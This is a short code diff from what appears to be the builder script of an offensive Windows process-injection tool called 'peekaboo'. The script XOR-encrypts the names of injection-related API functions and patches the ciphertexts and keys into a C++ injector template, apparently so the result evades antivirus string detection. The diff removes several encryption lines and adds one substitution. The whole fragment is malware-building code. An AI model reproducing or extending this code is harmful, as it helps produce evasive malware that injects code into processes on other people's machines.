@@ -102,10 +102,6 @@ def run_peekaboo(host, port):
     ciphertext_wpm, wpm_key = encryptor.xor_encrypt(f_wpm, encryptor.func_key())
     ciphertext_cth, ct_key = encryptor.xor_encrypt(f_cth, encryptor.func_key())
     ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso, encryptor.func_key())
-    ciphertext_clh, clh_key = encryptor.xor_encrypt(f_clh, encryptor.func_key())
-    ciphertext_p32f, p32f_key = encryptor.xor_encrypt(f_p32f, encryptor.func_key())
-    ciphertext_ct32s, ct32s_key = encryptor.xor_encrypt(f_ct32s, encryptor.func_key())
-    ciphertext_op, op_key = encryptor.xor_encrypt(f_op, encryptor.func_key())
 
     tmp = open("peekaboo_inj.cpp", "rt")
     data = tmp.read()
@@ -114,6 +110,7 @@ def run_peekaboo(host, port):
     data = data.replace('unsigned char s_vaex[] = { };', 'unsigned char s_vaex[] = ' + ciphertext_vaex)
     data = data.replace('unsigned char s_cth[] = { };', 'unsigned char s_cth[] = ' + ciphertext_cth)
     data = data.replace('unsigned char s_wfso[] = { };', 'unsigned char s_wfso[] = ' + ciphertext_wfso)
+    data = data.replace('unsigned char s_wpm[] = { };', 'unsigned char s_wpm[] = ' + ciphertext_wpm)
 
     data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
     data = data.replace('char f_key[] = "";', 'char f_key[] = "' + vaex_key + '";')
